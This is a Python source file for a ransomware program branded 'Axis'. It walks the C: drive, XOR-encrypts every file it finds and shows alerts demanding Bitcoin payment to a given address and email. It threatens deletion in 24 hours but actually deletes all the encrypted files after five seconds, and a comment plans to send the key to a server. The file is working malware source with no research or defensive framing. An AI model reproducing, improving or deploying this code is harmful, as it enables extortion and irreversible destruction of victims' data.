import pyautogui
import datetime
import random
import os

from _thread import start_new_thread

class Ransomware:
    def __init__(self, btc_address, email, ransom_amount, encryption_level=32, folder='C:\\'):
        self.encryption_level = encryption_level
        self.ransom_amount = ransom_amount
        self.btc_address = btc_address
        self.folder = folder
        self.email = email
        
        self.deleted = False

    def threader(self):
        while True:
            time_for_deletion = self.time_for_deletion
            if datetime.datetime.now() > datetime.datetime.strptime(time_for_deletion, '%Y-%m-%d %H:%M:%S'):
                for file in self.files:
                    os.remove(file)
                    print(f'Deleted {file}')
                self.deleted = True
                pyautogui.alert('Your files have been deleted. Cooperate next time.', 'Axis')
                break

    def prompt(self):
        if self.deleted:
            return

        key = pyautogui.prompt(f'Enter your decryption key\nNote: Trying to force quit this application will have your files permanently removed.\nBTC address to send money: {self.btc_address}\nEmail address to confirm transaction: {self.email}\nRansom amount: ${self.ransom_amount} of BTC\n\n!!! {len(self.files)} of your files will be deleted in 24 hours ({self.time_for_deletion}) if payment is not recieved.\nIf you turn off your computer or try to quit the app, you will permanently lose your files. Do not make this mistake.', 'Axis', default='Your encryption key')

        if self.deleted:
            return

        if key == None:
            return self.prompt()
        
        if key != self.key:
            pyautogui.alert('Incorrect key ', 'Axis')
            return self.prompt()
        
        for file in self.files:
            self.decrypt(file)
            print(f'Decrypted {file} successfully')
        
        os.remove('key.txt')
        print('Deleted key.txt')
        pyautogui.alert('Your files have been decrypted. Thank you for your cooperation.', 'Axis')

    def start(self):
        self.key = self.generate_key()
        self.write_key(self.key)

        self.files = self.get_files()
        for file in self.files:
            self.encrypt(file)
        
        pyautogui.alert('What happened to your files?', 'Axis')
        pyautogui.alert('Your files have been encrypted with military-grade encryption.', 'Axis')
        pyautogui.alert(f'The only way to recover your files is to send ${self.ransom_amount} of Bitcoin to {self.btc_address}', 'Axis')
        pyautogui.alert(f'After the money has been sent, email {self.email} with your transaction ID, and we will send back your decryption key', 'Axis')
        pyautogui.alert(f'{len(self.files)} of your files will be deleted in 24 hours if payment is not recieved.', 'Axis')

        self.time_for_deletion = (datetime.datetime.now() + datetime.timedelta(seconds=5)).strftime('%Y-%m-%d %H:%M:%S')
        start_new_thread(self.threader, ())

        self.prompt()

    def get_files(self):
        files = []

        for root, dirs, items in os.walk(self.folder):
            for file in items:
                if file.startswith('axis_') and file.endswith('.py'):
                    continue
                
                if file == 'axis.exe':
                    continue

                files.append(os.path.join(root, file).replace('\\', '/'))
        
        return files

    def generate_key(self):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+/,.<>?;:[]{}|\\=-"\'`~'

        key = ''

        for i in range(0, self.encryption_level):
            key += random.choice(chars)
        
        return key

    def write_key(self, key):
        # TODO: Send key to server instead of writing to file
        
        with open('key.txt', 'w') as f:
            f.write(key)

    def get_key(self):
        with open('key.txt', 'r') as f:
            return f.read()

    def encrypt(self, file_name):
        if not os.path.exists(file_name):
            return

        with open(file_name, 'r') as f:
            data = f.read()
        
        key = self.key
        encrypted_data = ''

        for i in range(0, len(data)):
            encrypted_data += chr(ord(data[i]) ^ ord(key[i % len(key)]))
        
        with open(file_name, 'w') as f:
            f.write(encrypted_data)

    def decrypt(self, file_name):
        if not os.path.exists(file_name):
            return
        
        if not self.key:
            self.key = self.get_key()

        with open(file_name, 'r') as f:
            data = f.read()
        
        decrypted_data = ''

        for i in range(0, len(data)):
            decrypted_data += chr(ord(data[i]) ^ ord(self.key[i % len(self.key)]))
        
        with open(file_name, 'w') as f:
            f.write(decrypted_data)